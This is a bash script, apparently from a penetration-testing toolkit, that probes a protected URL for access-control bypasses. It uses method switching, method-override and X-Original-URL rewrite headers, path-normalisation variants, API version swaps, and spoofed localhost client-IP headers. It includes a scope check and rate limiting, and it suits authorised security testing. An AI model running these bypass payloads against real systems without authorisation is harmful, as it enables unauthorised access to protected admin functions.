#!/usr/bin/env bash
# Bounded unauthenticated access-bypass matrix for one protected URL
# (AB-06 method switching, AB-07 forced browsing, AB-16 X-Original-URL/X-Rewrite-URL,
#  AB-17 path normalisation & API version swaps). Scope-gated, rate-limited, no cookies
# unless --cookie is given (use a LOW-privilege or unverified session of your own).
#
# Usage:
#   bypass_matrix.sh --target DOMAIN --url https://app.example.com/admin/users
#                    [--cookie 'session=...'] [--delay 0.5] [--out artifacts/authbypass/bypass_matrix.tsv]
#
# Output TSV: technique  method  url  extra_header  status  bytes  diff_vs_baseline
set -euo pipefail

TARGET="" URL="" COOKIE="" DELAY=0.5 OUT="artifacts/authbypass/bypass_matrix.tsv"
usage() { sed -n '2,12p' "$0" | sed 's/^# \{0,1\}//'; exit 2; }
while [ $# -gt 0 ]; do
  case "$1" in
    --target) TARGET="$2"; shift 2 ;;
    --url)    URL="$2"; shift 2 ;;
    --cookie) COOKIE="$2"; shift 2 ;;
    --delay)  DELAY="$2"; shift 2 ;;
    --out)    OUT="$2"; shift 2 ;;
    -h|--help) usage ;;
    *) echo "unknown argument: $1" >&2; usage ;;
  esac
done
[ -n "$TARGET" ] && [ -n "$URL" ] || usage

host="$(printf '%s' "$URL" | sed -E 's#^[a-zA-Z]+://##; s#[/:?].*$##' | tr '[:upper:]' '[:lower:]')"
t="$(printf '%s' "$TARGET" | tr '[:upper:]' '[:lower:]')"
if [ "$host" != "$t" ] && [[ "$host" != *".$t" ]]; then echo "URL host $host outside target $TARGET" >&2; exit 3; fi
"$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/../../../../scripts/scope_check.sh" "$host" || exit $?

origin="$(printf '%s' "$URL" | sed -E 's#^([a-zA-Z]+://[^/]+).*#\1#')"
path="/$(printf '%s' "$URL" | sed -E 's#^[a-zA-Z]+://[^/]+/?##; s#[?\#].*$##')"
path="${path%/}"; [ -n "$path" ] || path="/"
last="${path##*/}"; parent="${path%/*}"

CURL_COOKIE=()
[ -n "$COOKIE" ] && CURL_COOKIE=(-H "Cookie: $COOKIE")

mkdir -p "$(dirname "$OUT")"
printf 'technique\tmethod\turl\textra_header\tstatus\tbytes\tdiff_vs_baseline\n' > "$OUT"
BASE_CODE="" BASE_SIZE="" ROOT_CODE="" ROOT_SIZE=""

probe() {  # technique method url [header]
  local tech="$1" m="$2" u="$3" h="${4:-}"
  local args=(-sk --path-as-is --max-time 15 -o /dev/null -w '%{http_code}\t%{size_download}' -X "$m" "${CURL_COOKIE[@]+"${CURL_COOKIE[@]}"}")
  [ "$m" = "HEAD" ] && args=(-sk --path-as-is --max-time 15 -I -o /dev/null -w '%{http_code}\t%{size_download}' "${CURL_COOKIE[@]+"${CURL_COOKIE[@]}"}")
  [ -n "$h" ] && args+=(-H "$h")
  local r; r="$(curl "${args[@]}" "$u" 2>/dev/null || printf '000\t0')"
  local code="${r%%$'\t'*}" size="${r##*$'\t'}" diff=""
  local bc="$BASE_CODE" bs="$BASE_SIZE" bl="baseline"
  case "$tech" in x-*) bc="$ROOT_CODE"; bs="$ROOT_SIZE"; bl="root baseline" ;; esac
  if [ "$tech" = "root-baseline" ]; then ROOT_CODE="$code"; ROOT_SIZE="$size"; diff="reference for rewrite-header rows"
  elif [ -z "$BASE_CODE" ]; then BASE_CODE="$code"; BASE_SIZE="$size"; diff="baseline"
  elif [ "$code" != "$bc" ] || [ "$size" != "$bs" ]; then
    diff="DIFF ($bl $bc/$bs)"
    [[ "$code" =~ ^2 ]] && [[ ! "$bc" =~ ^2 ]] && diff="!! 2xx where $bl was $bc"
  fi
  printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$tech" "$m" "$u" "${h:--}" "$code" "$size" "$diff" | tee -a "$OUT"
  sleep "$DELAY"
}

probe baseline GET "$URL"
# AB-06 method switching / override
for m in POST HEAD PUT PATCH OPTIONS DELETE TRACE FOO; do
  [ "$m" = "DELETE" ] && continue   # never send destructive verbs automatically
  probe method-switch "$m" "$URL"
done
for h in "X-HTTP-Method-Override: GET" "X-HTTP-Method: GET" "X-Method-Override: GET"; do
  probe method-override POST "$URL" "$h"
done
# AB-16 rewrite headers
probe root-baseline GET "$origin/"
probe x-original-url GET "$origin/" "X-Original-URL: $path"
probe x-rewrite-url GET "$origin/" "X-Rewrite-URL: $path"
probe x-original-url-404-check GET "$origin/" "X-Original-URL: /bbtest-does-not-exist-$RANDOM"
# AB-17 path normalisation
for v in "$path/" "$path/." "/$path" "$path//" "/.$path" "$path%2f" "$path%20" "$path%09" "$path;" "$path;x=1" \
         "$path..;/" "$path.json" "$path?" "$path#" "$parent/%2e/$last" "$parent/./$last" "$parent//$last" \
         "$(printf '%s' "$path" | tr '[:lower:]' '[:upper:]')" "$parent/$last%00" "/%2e$path"; do
  probe path-variant GET "$origin$v"
done
# AB-17 API version swaps
if [[ "$path" =~ /v([0-9]+)/ ]]; then
  cur="${BASH_REMATCH[1]}"
  for alt in $(printf '%s
' 0 1 2 3 4 "$((cur + 1))" | sort -un); do
    [ "$alt" = "$cur" ] && continue
    probe api-version GET "$origin${path/\/v$cur\//\/v$alt\/}"
  done
  probe api-version GET "$origin${path/\/v$cur\//\/}"
fi
# client-IP trust headers (often combined with IP allowlists on admin paths)
for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" \
         "True-Client-IP: 127.0.0.1" "Forwarded: for=127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1"; do
  probe ip-trust-header GET "$URL" "$h"
done
echo "[+] Results -> $OUT  (a DIFF is a lead: compare bodies manually; many apps return 200 + login page)"
